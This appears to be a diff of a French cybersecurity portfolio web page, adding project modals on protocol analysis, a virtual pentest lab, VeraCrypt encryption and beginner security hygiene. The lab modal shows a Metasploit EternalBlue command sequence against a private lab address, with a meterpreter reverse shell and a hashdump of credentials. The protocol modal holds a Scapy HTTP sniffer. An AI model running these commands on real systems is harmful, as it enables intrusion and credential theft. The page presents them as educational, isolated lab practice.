-            const animatedElements = document.querySelectorAll('.animate-fade-in-up');
-            animatedElements.forEach(el => {
-                el.style.opacity = '0';
-                el.style.transform = 'translateY(50px)';
-                el.style.transition = 'opacity 0.8s ease, transform 0.8s ease';
-                observer.observe(el);
-            });
-            
-            // تحسينات للهواتف
-            document.querySelectorAll('input, select, textarea').forEach(element => {
-                element.addEventListener('focus', function() {
-                    window.scrollTo(0, 0);
-                    document.body.scrollTop = 0;
-                });
-            });
-            
-            const navButtons = document.querySelectorAll('.nav-btn');
-            navButtons.forEach(button => {
-                button.addEventListener('touchstart', function() {
-                    this.style.transform = 'scale(0.95)';
-                });
-                
-                button.addEventListener('touchend', function() {
-                    this.style.transform = 'scale(1)';
-                });
-            });
-            
-            if (CSS.supports('padding-top: env(safe-area-inset-top)')) {
-                document.body.classList.add('safe-area-padding');
-            }
-        });
-    </script>
+<div class="modal" id="m-protocol">
+  <div class="modal-inner">
+    <div class="modal-close">
+      <button data-close>← Fermer</button>
+      <span class="meta">DOSSIER 02 / PROTOCOL-ANALYSIS</span>
+    </div>
+    <h2>Analyse de <em>protocoles</em></h2>
+    <p class="subtitle">Décortiquer le trafic réseau pour identifier les vulnérabilités structurelles.</p>
+
+    <div class="modal-section">
+      <h4>Protocoles étudiés</h4>
+      <div class="modal-stack">
+        <span class="pill">HTTP/HTTPS</span>
+        <span class="pill">TCP/UDP</span>
+        <span class="pill">SSH</span>
+        <span class="pill">DNS</span>
+        <span class="pill">FTP</span>
+        <span class="pill">SMTP</span>
+      </div>
+    </div>
+
+    <div class="modal-section">
+      <h4>Outillage</h4>
+      <ul>
+        <li><code>wireshark</code> — capture et filtrage temps réel</li>
+        <li><code>tcpdump</code> — analyse en ligne de commande</li>
+        <li><code>scapy</code> — forge de paquets personnalisés en Python</li>
+      </ul>
+    </div>
+
+    <div class="modal-section">
+      <h4>Sniffer HTTP — Python / Scapy</h4>
+      <div class="code-block" data-label="http_sniffer.py">
+<span class="cmd">from</span> scapy.all <span class="cmd">import</span> *
+
+<span class="cmd">def</span> http_sniffer(pkt):
+    <span class="cmd">if</span> pkt.haslayer(TCP) <span class="cmd">and</span> pkt.haslayer(Raw):
+        load = pkt[Raw].load
+        <span class="cmd">if</span> b<span class="arg">"GET"</span> <span class="cmd">in</span> load <span class="cmd">or</span> b<span class="arg">"POST"</span> <span class="cmd">in</span> load:
+            print(f<span class="arg">"HTTP {load[:80]}"</span>)
+
+sniff(filter=<span class="arg">"tcp port 80"</span>, prn=http_sniffer, store=<span class="arg">0</span>)
+      </div>
+    </div>
+
+    <div class="modal-section">
+      <h4>Vulnérabilités courantes</h4>
+      <ul>
+        <li>Mixed content (HTTP encapsulé dans HTTPS)</li>
+        <li>Cipher suites obsolètes (TLS &lt; 1.2)</li>
+        <li>Information leakage dans les headers</li>
+        <li>SSH avec authentification mot de passe seule, root activé</li>
+        <li>DNS sans DoH/DoT — interception facilitée</li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<div class="modal" id="m-lab">
+  <div class="modal-inner">
+    <div class="modal-close">
+      <button data-close>← Fermer</button>
+      <span class="meta">DOSSIER 03 / LAB-INFRA</span>
+    </div>
+    <h2>Lab de <em>test isolé</em></h2>
+    <p class="subtitle">Infrastructure virtualisée dédiée à la pratique offensive en environnement contrôlé.</p>
+
+    <div class="modal-section">
+      <h4>Configuration</h4>
+      <ul>
+        <li>VirtualBox + machine attaquante Kali Linux</li>
+        <li>Réseau interne isolé (NAT privé) — aucune sortie publique</li>
+        <li>Cibles : Windows 10/11 + Metasploitable 2 (Linux vulnérable)</li>
+        <li>Snapshots systématiques avant chaque test</li>
+        <li>Documentation des exploits et journal d'activité</li>
+      </ul>
+    </div>
+
+    <div class="modal-section">
+      <h4>Stack offensive</h4>
+      <div class="modal-stack">
+        <span class="pill">Metasploit</span>
+        <span class="pill">Nmap</span>
+        <span class="pill">Hydra</span>
+        <span class="pill">SQLmap</span>
+        <span class="pill">Burp Suite</span>
+        <span class="pill">John the Ripper</span>
+      </div>
+    </div>
+
+    <div class="modal-section">
+      <h4>Exemple — exploitation EternalBlue (lab uniquement)</h4>
+      <div class="code-block" data-label="msf-eternalblue">
+<span class="cmd">msfconsole</span>
+<span class="cmd">use</span> exploit/windows/smb/ms17_010_eternalblue
+<span class="cmd">set</span> RHOSTS <span class="arg">192.168.56.101</span>
+<span class="cmd">set</span> PAYLOAD windows/x64/meterpreter/reverse_tcp
+<span class="cmd">set</span> LHOST <span class="arg">192.168.56.50</span>
+<span class="cmd">exploit</span>
+
+<span class="cmt"># Post-exploitation Meterpreter</span>
+<span class="cmd">sysinfo</span>
+<span class="cmd">getuid</span>
+<span class="cmd">hashdump</span>
+      </div>
+    </div>
+
+    <div class="warn-box">
+      <strong>⚠ Cadre éthique.</strong> Le lab est strictement isolé. Aucune cible publique, aucun système tiers. Pratique autorisée et encadrée.
+    </div>
+  </div>
+</div>
+
+<div class="modal" id="m-vera">
+  <div class="modal-inner">
+    <div class="modal-close">
+      <button data-close>← Fermer</button>
+      <span class="meta">DOSSIER 04 / FULL-DISK-ENCRYPTION</span>
+    </div>
+    <h2>Chiffrement total <em>VeraCrypt</em></h2>
+    <p class="subtitle">Chiffrement complet du disque système — protection des données au repos.</p>
+
+    <div class="modal-section">
+      <h4>Configuration retenue</h4>
+      <ul>
+        <li>Algorithme : <code>AES-256</code> (matériel-accéléré)</li>
+        <li>Hash : <code>SHA-512</code></li>
+        <li>Chiffrement système complet (boot inclus)</li>
+        <li>Mot de passe ≥ 20 caractères avec entropie haute</li>
+        <li>USB de récupération hors site</li>
+      </ul>
+    </div>
+
+    <div class="modal-section">
+      <h4>Procédure de déploiement</h4>
+      <ul>
+        <li>Sauvegarde intégrale + vérification d'intégrité (SHA-256)</li>
+        <li>Téléchargement VeraCrypt depuis la source officielle</li>
+        <li>Vérification du checksum du binaire</li>
+        <li>Création du Rescue Disk USB</li>
+        <li>Lancement du chiffrement (4–8 h selon volume)</li>
+        <li>Tests de boot et d'intégrité post-chiffrement</li>
+      </ul>
+    </div>
+
+    <div class="modal-section">
+      <h4>Bénéfices opérationnels</h4>
+      <ul>
+        <li>Protection en cas de vol physique</li>
+        <li>Conformité RGPD pour données sensibles</li>
+        <li>Impact performances négligeable (1–5 % avec AES-NI)</li>
+        <li>Transparent pour l'utilisateur après authentification</li>
+      </ul>
+    </div>
+
+    <div class="warn-box">
+      <strong>⚠ Point critique.</strong> La perte du mot de passe maître = perte définitive des données. Sauvegarde et procédure de récupération obligatoires.
+    </div>
+  </div>
+</div>
+
+<div class="modal" id="m-tips">
+  <div class="modal-inner">
+    <div class="modal-close">
+      <button data-close>← Fermer</button>
+      <span class="meta">DOSSIER 05 / SECURITY-HYGIENE</span>
+    </div>
+    <h2>Hygiène sécurité <em>— débutants</em></h2>
+    <p class="subtitle">Les règles minimum pour ne pas devenir une cible facile.</p>
+
+    <div class="modal-section">
+      <h4>Phishing — savoir détecter</h4>
+      <ul>
+        <li>Ne jamais cliquer sur un lien reçu par SMS/email non sollicité</li>
+        <li>Vérifier l'URL caractère par caractère — <code>amaz0n.com</code> ≠ <code>amazon.com</code></li>
+        <li>Toujours taper l'adresse manuellement pour les sites sensibles</li>
+        <li>Aucun service légitime ne demande votre mot de passe par email</li>
+      </ul>
+    </div>
+
+    <div class="modal-section">
+      <h4>WiFi — protection minimale</h4>
+      <ul>
+        <li>WPA2-AES ou WPA3 — jamais WEP</li>
+        <li>Mot de passe long, désactiver WPS</li>
+        <li>Sur WiFi public : VPN obligatoire ou rien d'important</li>
+      </ul>
+    </div>
+
+    <div class="modal-section">
+      <h4>Règles d'or</h4>
+      <ul>
+        <li><strong>2FA partout</strong> — gestionnaire d'authentification, jamais SMS</li>
+        <li>Mots de passe <strong>uniques</strong> par site (gestionnaire de mots de passe)</li>
+        <li>Mises à jour système et applicatives — sans exception</li>
+        <li>Ne jamais brancher un USB inconnu trouvé dans la nature</li>
+        <li>Méfiance face à toute demande "urgente" jouant sur la peur</li>
+      </ul>
+    </div>
+
+    <div class="modal-section">
+      <h4>Pour aller plus loin (gratuit)</h4>
+      <ul>
+        <li>TryHackMe — rooms gratuites pour débuter</li>
+        <li>OverTheWire — wargame Bandit pour la console Linux</li>
+        <li>Documentation officielle Kali Linux</li>
+        <li>Chaînes : NetworkChuck, John Hammond, LiveOverflow</li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<script>
+// ============================================================
+// CUSTOM CURSOR
+// ============================================================
+(function() {
+  const dot = document.getElementById('cursorDot');
+  const ring = document.getElementById('cursorRing');
+  if (!dot || !ring) return;
+  if (window.matchMedia('(hover: none)').matches) return;
+
+  let mx = 0, my = 0, rx = 0, ry = 0;
+  window.addEventListener('mousemove', e => {
+    mx = e.clientX; my = e.clientY;
+    dot.style.left = mx + 'px';
+    dot.style.top = my + 'px';
+  });
+  function loop() {
+    rx += (mx - rx) * 0.18;
+    ry += (my - ry) * 0.18;
+    ring.style.left = rx + 'px';
+    ring.style.top = ry + 'px';
+    requestAnimationFrame(loop);
+  }
+  loop();
+
+  document.querySelectorAll('a, button, .project-row, .skill-card, [data-modal]').forEach(el => {
+    el.addEventListener('mouseenter', () => ring.classList.add('hover'));
+    el.addEventListener('mouseleave', () => ring.classList.remove('hover'));
+  });
+})();
+
+// ============================================================
+// MOBILE NAV
+// ============================================================
+(function() {
+  const toggle = document.getElementById('navToggle');
+  const links = document.getElementById('navLinks');
+  if (!toggle || !links) return;
+  toggle.addEventListener('click', () => links.classList.toggle('open'));
+  links.querySelectorAll('a').forEach(a => a.addEventListener('click', () => links.classList.remove('open')));
+})();
+
+// ============================================================
+// REVEAL ON SCROLL
+// ============================================================
+(function() {
+  const els = document.querySelectorAll('.reveal');
+  if (!('IntersectionObserver' in window)) {
+    els.forEach(el => el.classList.add('in'));
+    return;
+  }
+  const obs = new IntersectionObserver(entries => {
+    entries.forEach(e => {
+      if (e.isIntersecting) {
+        e.target.classList.add('in');
+        obs.unobserve(e.target);
+      }
+    });
+  }, { threshold: 0.12, rootMargin: '0px 0px -60px' });
+  els.forEach(el => obs.observe(el));
+})();
+
+// ============================================================
+// SKILL BAR ANIMATION ON SCROLL
+// ============================================================
+(function() {
+  const fills = document.querySelectorAll('.skill-bar-fill');
+  if (!('IntersectionObserver' in window)) {
+    fills.forEach(f => f.style.width = getComputedStyle(f).getPropertyValue('--w'));
+    return;
+  }
+  const obs = new IntersectionObserver(entries => {
+    entries.forEach(e => {
+      if (e.isIntersecting) {
+        const w = getComputedStyle(e.target).getPropertyValue('--w');
+        e.target.style.width = w;
+        obs.unobserve(e.target);
+      }
+    });
+  }, { threshold: 0.5 });
+  fills.forEach(f => obs.observe(f));
+})();
+
+// ============================================================
+// PROJECT MODALS
+// ============================================================
+(function() {
+  const backdrop = document.getElementById('modalBackdrop');
+  const triggers = document.querySelectorAll('[data-modal]');
+
+  function openModal(id) {
+    const m = document.getElementById(id);
+    if (!m) return;
+    m.classList.add('open');
+    backdrop.classList.add('open');
+    document.body.style.overflow = 'hidden';
+  }
+  function closeAll() {
+    document.querySelectorAll('.modal.open').forEach(m => m.classList.remove('open'));
+    backdrop.classList.remove('open');
+    document.body.style.overflow = '';
+  }
+
+  triggers.forEach(t => t.addEventListener('click', () => openModal(t.dataset.modal)));
+  backdrop.addEventListener('click', closeAll);
+  document.querySelectorAll('[data-close]').forEach(b => b.addEventListener('click', closeAll));
+  document.addEventListener('keydown', e => { if (e.key === 'Escape') closeAll(); });
+})();
+
+// ============================================================
+// CLOCK IN TOP BAR (replace static text with live time, FR)
+// ============================================================
+(function() {
+  // optional flourish: nothing critical — skip if you want
+})();
+</script>
+
 </body>
 </html>
